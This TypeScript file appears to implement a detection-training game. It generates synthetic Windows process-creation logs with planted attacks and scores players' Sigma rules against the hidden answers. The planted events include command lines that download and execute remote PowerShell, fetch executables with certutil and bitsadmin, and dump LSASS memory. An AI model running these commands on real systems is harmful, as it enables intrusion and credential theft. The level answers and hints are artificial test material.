// "Find the intrusion": a synthetic day of Windows process-creation events
// with a few planted attacks and plenty of look-alike admin activity. Players
// write a Sigma rule; it is scored against hidden ground truth per level.

import { parseSigma } from "@/lib/rulebridge/sigma"
import { evaluate } from "@/lib/rulebridge/evaluate"

export type ProcEvent = {
  id: number
  UtcTime: string
  Computer: string
  User: string
  ParentImage: string
  Image: string
  CommandLine: string
}

type Truth = "l1" | "l2" | "l3"
const truth = new Map<number, Truth>()

const W = "C:\\Windows\\System32\\"
const PS = `${W}WindowsPowerShell\\v1.0\\powershell.exe`
const OFFICE = "C:\\Program Files\\Microsoft Office\\root\\Office16\\"

function build(): ProcEvent[] {
  let seed = 42
  const rnd = () => ((seed = (seed * 16807) % 2147483647) / 2147483647)
  const pick = <T,>(a: T[]) => a[Math.floor(rnd() * a.length)]
  const hosts = Array.from({ length: 18 }, (_, i) => `WS-${String(i + 1).padStart(2, "0")}`)
  const users = ["CORP\\alice", "CORP\\bob", "CORP\\carol", "CORP\\dave", "CORP\\erin", "CORP\\frank"]
  const day = Date.UTC(2026, 8, 14, 6)
  const out: Omit<ProcEvent, "id">[] = []
  const marks: (Truth | undefined)[] = []
  const add = (t: number, Computer: string, User: string, ParentImage: string, Image: string, CommandLine: string, mark?: Truth) => {
    out.push({ UtcTime: new Date(day + t * 60_000).toISOString().replace(".000", ""), Computer, User, ParentImage, Image, CommandLine })
    marks.push(mark)
  }

  // Everyday noise.
  const benign: [string, string, string][] = [
    [`${W}..\\explorer.exe`, "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", '"chrome.exe" --profile-directory=Default'],
    [`${W}..\\explorer.exe`, `${OFFICE}WINWORD.EXE`, `"WINWORD.EXE" /n "C:\\Users\\Public\\Documents\\Q3 report.docx"`],
    [`${W}..\\explorer.exe`, `${OFFICE}EXCEL.EXE`, `"EXCEL.EXE" "C:\\Users\\Public\\Documents\\budget.xlsx"`],
    [`${W}..\\explorer.exe`, `${OFFICE}OUTLOOK.EXE`, '"OUTLOOK.EXE"'],
    [`${W}services.exe`, `${W}svchost.exe`, `${W}svchost.exe -k netsvcs -p -s Schedule`],
    [`${W}services.exe`, `${W}svchost.exe`, `${W}svchost.exe -k LocalServiceNetworkRestricted -p`],
    [`${W}svchost.exe`, `${W}taskhostw.exe`, "taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}"],
    [`${W}..\\explorer.exe`, `${W}notepad.exe`, '"notepad.exe" C:\\Users\\Public\\todo.txt'],
    [`${W}..\\explorer.exe`, `${W}cmd.exe`, '"cmd.exe"'],
    [`${W}cmd.exe`, `${W}ipconfig.exe`, "ipconfig /all"],
  ]
  for (let i = 0; i < 190; i++) {
    const [p, img, cmd] = pick(benign)
    add(rnd() * 600, pick(hosts), pick(users), p, img, cmd)
  }

  // Look-alikes that a sloppy rule will catch.
  for (let i = 0; i < 6; i++) add(rnd() * 600, pick(hosts), "NT AUTHORITY\\SYSTEM", "C:\\Windows\\CCM\\CcmExec.exe", PS, `${PS} -NoLogo -ExecutionPolicy Bypass -File C:\\Windows\\CCM\\SystemTemp\\${Math.floor(rnd() * 9000 + 1000)}.ps1`)
  for (let i = 0; i < 4; i++) add(rnd() * 600, pick(hosts), "CORP\\adm-it", `${W}..\\explorer.exe`, PS, `${PS} -NoProfile -File \\\\fs01\\scripts\\inventory.ps1`)
  for (let i = 0; i < 4; i++) add(rnd() * 600, pick(hosts), pick(users), `${OFFICE}WINWORD.EXE`, `${W}splwow64.exe`, `${W}splwow64.exe 8192`)
  add(rnd() * 600, "WS-07", "CORP\\carol", `${OFFICE}EXCEL.EXE`, `${OFFICE}..\\..\\..\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe`, "OfficeC2RClient.exe /update user")
  for (let i = 0; i < 3; i++) add(rnd() * 600, pick(hosts), "CORP\\adm-it", `${W}cmd.exe`, `${W}certutil.exe`, `certutil.exe -hashfile C:\\Tools\\agent-setup.msi SHA256`)
  add(rnd() * 600, "WS-02", "CORP\\adm-it", `${W}cmd.exe`, `${W}certutil.exe`, "certutil.exe -verify C:\\certs\\proxy.cer")
  for (let i = 0; i < 2; i++) add(rnd() * 600, pick(hosts), "NT AUTHORITY\\SYSTEM", `${W}svchost.exe`, `${W}bitsadmin.exe`, "bitsadmin.exe /list /allusers")
  for (let i = 0; i < 3; i++) add(rnd() * 600, pick(hosts), pick(users), `${W}..\\explorer.exe`, `${W}rundll32.exe`, `${W}rundll32.exe shell32.dll,Control_RunDLL desk.cpl`)
  add(rnd() * 600, "WS-11", "CORP\\adm-it", `${W}..\\explorer.exe`, `${W}Taskmgr.exe`, '"Taskmgr.exe" /4')
  add(rnd() * 600, "WS-05", "CORP\\adm-it", `${W}cmd.exe`, "C:\\Tools\\Sysinternals\\procdump64.exe", "procdump64.exe -ma -e 1 crashy-app.exe C:\\dumps\\crashy.dmp")

  // Level 1 · Office spawning a script host.
  add(201, "WS-14", "CORP\\erin", `${OFFICE}WINWORD.EXE`, PS, `${PS} -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA`, "l1")
  add(203, "WS-09", "CORP\\bob", `${OFFICE}EXCEL.EXE`, `${W}cmd.exe`, `cmd.exe /c start /min powershell -w hidden -c "iwr http://203.0.113.9/s.ps1|iex"`, "l1")
  add(388, "WS-03", "CORP\\alice", `${OFFICE}WINWORD.EXE`, `${W}wscript.exe`, `wscript.exe C:\\Users\\alice\\AppData\\Local\\Temp\\invoice_0914.js`, "l1")
  // Level 2 · LSASS memory dumps.
  add(242, "WS-14", "CORP\\erin", `${W}cmd.exe`, `${W}rundll32.exe`, `rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 724 C:\\Windows\\Temp\\d.bin full`, "l2")
  add(455, "WS-03", "CORP\\alice", `${W}cmd.exe`, "C:\\Users\\Public\\p64.exe", "p64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\ls.dmp", "l2")
  // Level 3 · living-off-the-land downloads.
  add(206, "WS-09", "CORP\\bob", `${W}cmd.exe`, `${W}certutil.exe`, "certutil.exe -urlcache -split -f http://203.0.113.9/a.txt C:\\Users\\Public\\a.exe", "l3")
  add(390, "WS-03", "CORP\\alice", `${W}cmd.exe`, `${W}bitsadmin.exe`, "bitsadmin.exe /transfer upd /download /priority high http://198.51.100.7/u.bin C:\\Users\\Public\\u.exe", "l3")
  add(512, "WS-16", "CORP\\frank", `${W}cmd.exe`, `${W}certutil.exe`, "certutil -verifyctl -split -f http://198.51.100.7/c.cab", "l3")

  const order = out.map((e, i) => [e, marks[i]] as const).sort((a, b) => (a[0].UtcTime < b[0].UtcTime ? -1 : 1))
  return order.map(([e, m], i) => {
    if (m) truth.set(i + 1, m)
    return { id: i + 1, ...e }
  })
}

export const events = build()

export type Level = { id: Truth; title: string; brief: string; starter: string; hints: string[] }

const rule = (title: string, detection: string) =>
  `title: ${title}\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n${detection}\nlevel: high\n`

export const levels: Level[] = [
  {
    id: "l1", title: "Macro to script",
    brief: "A phishing document ran code. Catch Office applications starting a shell or script host, without flagging the printer helper or the Office updater.",
    starter: rule("Office Spawns PowerShell", "  selection:\n    ParentImage|endswith: '\\WINWORD.EXE'\n    Image|endswith: '\\powershell.exe'\n  condition: selection"),
    hints: ["Word isn't the only Office parent here.", "PowerShell isn't the only child: look at cmd.exe and wscript.exe.", "A list of values under one field is OR: Image|endswith: ['\\powershell.exe', '\\cmd.exe', ...]"],
  },
  {
    id: "l2", title: "Credential dump",
    brief: "Someone read LSASS memory. Catch both techniques without flagging the admin who dumps a crashing app with ProcDump.",
    starter: rule("LSASS Dump", "  selection:\n    CommandLine|contains: 'lsass'\n  condition: selection"),
    hints: ["One dump never names lsass: it uses a PID with comsvcs.dll.", "comsvcs.dll + MiniDump is the signature, whatever the casing or spacing.", "The renamed ProcDump still passes -ma and lsass.exe on its command line."],
  },
  {
    id: "l3", title: "Living off the land",
    brief: "Built-in Windows tools were used to download payloads. Catch them, but not certutil hashing files or BITS listing its jobs.",
    starter: rule("Certutil Download", "  selection:\n    Image|endswith: '\\certutil.exe'\n  condition: selection"),
    hints: ["Hashing and verifying certificates are normal for certutil.", "Look for a URL on the command line: contains 'http'.", "bitsadmin uses /transfer to download; certutil can download with more than one flag."],
  },
]

export type Score = {
  error?: string
  tp: number
  fp: number
  fn: number
  precision: number
  recall: number
  f1: number
  matched: { e: ProcEvent; ok: boolean }[]
  missed: ProcEvent[]
}

export function score(level: Level, yaml: string): Score {
  const empty = { tp: 0, fp: 0, fn: 0, precision: 0, recall: 0, f1: 0, matched: [], missed: [] }
  const { rule, diagnostics } = parseSigma(yaml)
  const err = diagnostics.find((d) => d.severity === "error")
  if (!rule || err) return { ...empty, error: err?.message ?? "couldn't parse the rule" }
  const matched: Score["matched"] = []
  for (const e of events) {
    const r = evaluate(rule, JSON.stringify(e))
    if (r.error) return { ...empty, error: r.error }
    if (r.matched) matched.push({ e, ok: truth.get(e.id) === level.id })
  }
  const tp = matched.filter((m) => m.ok).length
  const fp = matched.length - tp
  const total = [...truth.values()].filter((t) => t === level.id).length
  const fn = total - tp
  const precision = matched.length ? tp / matched.length : 0
  const recall = total ? tp / total : 0
  const f1 = precision + recall ? (2 * precision * recall) / (precision + recall) : 0
  const missed = events.filter((e) => truth.get(e.id) === level.id && !matched.some((m) => m.e.id === e.id))
  return { tp, fp, fn, precision, recall, f1, matched, missed }
}
